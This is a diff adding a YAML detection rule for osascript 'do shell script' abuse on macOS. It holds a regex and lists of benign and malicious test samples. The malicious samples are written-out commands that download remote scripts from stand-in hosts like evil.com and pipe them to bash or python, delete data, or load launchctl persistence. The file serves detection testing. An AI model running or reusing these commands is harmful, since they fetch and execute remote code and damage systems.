@@ -1,0 +1,59 @@
+name: medium-14-osascript
+severity: medium
+description: >
+  Detects osascript executing remote scripts or inline AppleScript. macOS-specific attack vector.
+
+pattern: |
+  (?i)osascript.*do\s+shell\s+script.*(curl|wget|bash|sh|python|ruby|perl|rm|chmod|sudo|launchctl)
+
+malicious:
+  - 'osascript -e ''do shell script "curl http://evil.com/malware.sh | bash"'''
+  - 'osascript -e ''do shell script "wget http://attacker.com/backdoor.sh -O /tmp/b.sh && bash /tmp/b.sh"'''
+  - 'osascript -e ''do shell script "python -c ''import urllib; exec(urllib.urlopen(''''http://evil.com/p.py'''').read())''"'''
+  - 'osascript -e ''do shell script "curl -s http://malware.com/dropper.sh | sh"'''
+  - 'osascript -e ''do shell script "ruby -e ''require ''''net/http''''; eval(Net::HTTP.get(URI(''''http://evil.com/s.rb'''')))''"'''
+  - 'osascript -e ''do shell script "bash <(curl -s http://attacker.com/payload.sh)"'''
+  - 'osascript -e ''do shell script "wget -qO- http://evil.com/clickfix.sh | bash"'''
+  - 'osascript -e ''do shell script "curl http://malware.com/implant.py | python"'''
+  - 'osascript -e ''do shell script "sh -c ''$(curl -fsSL http://evil.com/stage2.sh)''"'''
+  - 'osascript -e ''do shell script "perl -e ''use LWP::Simple; eval(get(''''http://attacker.com/p.pl''''))''"'''
+  - 'osascript -e ''do shell script "curl http://evil.com/ransomware.sh | sudo bash"'''
+  - 'osascript -e ''do shell script "wget http://malware.com/backdoor.rb -O /tmp/b.rb && ruby /tmp/b.rb"'''
+  - 'osascript -e ''do shell script "bash -c ''curl http://evil.com/trojan.sh | bash''"'''
+  - 'osascript -e ''do shell script "python3 -c ''import urllib.request; exec(urllib.request.urlopen(''''http://evil.com/mal.py'''').read())''"'''
+  - 'osascript -e ''do shell script "curl -L http://attacker.com/loader.sh | sh"'''
+  - 'osascript -e ''do shell script "rm -rf /important/data && curl http://evil.com/notify"'''
+  - 'osascript -e ''do shell script "chmod +x /tmp/malware && /tmp/malware"'''
+  - 'osascript -e ''do shell script "curl http://evil.com/cron.sh | bash && launchctl load /tmp/persistence.plist"'''
+  - 'osascript -e ''do shell script "wget -O /tmp/dropper http://malware.com/dropper && chmod 755 /tmp/dropper && /tmp/dropper"'''
+  - 'osascript -e ''do shell script "bash <(wget -qO- http://evil.com/obfuscated.sh)"'''
+  - 'osascript -e ''do shell script "curl -s http://attacker.com/reverse.sh | sh -s"'''
+  - 'osascript -e ''do shell script "python -m http.server 8080 & curl http://evil.com/exfil.sh | bash"'''
+  - 'osascript -e ''do shell script "sudo curl http://malware.com/rootkit.sh | bash"'''
+  - 'osascript -e ''do shell script "perl -MLWP::Simple -e ''eval(get(''''http://evil.com/payload.pl''''))''"'''
+  - 'osascript -e ''do shell script "curl http://192.168.1.100/malware.sh | bash"'''
+
+benign:
+  - 'osascript -e ''display dialog "Hello World"'''
+  - 'osascript -e ''tell application "Safari" to activate'''
+  - "osascript -e 'get volume settings'"
+  - "osascript -e 'set volume output volume 50'"
+  - 'osascript -e ''display notification "Task Complete"'''
+  - 'osascript -e ''tell application "System Events" to keystroke "test"'''
+  - 'osascript -e ''do shell script "date"'''
+  - 'osascript -e ''do shell script "whoami"'''
+  - 'osascript -e ''do shell script "hostname"'''
+  - 'osascript -e ''do shell script "ls /Applications"'''
+  - 'osascript -e ''do shell script "echo Hello World"'''
+  - 'osascript -e ''do shell script "pwd"'''
+  - 'osascript -e ''do shell script "uptime"'''
+  - 'osascript -e ''tell application "Finder" to get name of startup disk'''
+  - 'osascript -e ''do shell script "df -h"'''
+  - 'osascript -e ''do shell script "ps aux"'''
+  - 'osascript -e ''tell application "System Events" to get name of processes'''
+  - 'osascript -e ''do shell script "system_profiler SPHardwareDataType"'''
+  - 'osascript -e ''do shell script "networksetup -listallhardwareports"'''
+  - 'osascript -e ''do shell script "sw_vers"'''
+  - 'osascript -e ''do shell script "xcode-select --version"'''
+  - 'osascript -e ''do shell script "which git"'''
+  - 'osascript -e ''do shell script "brew --version"'''
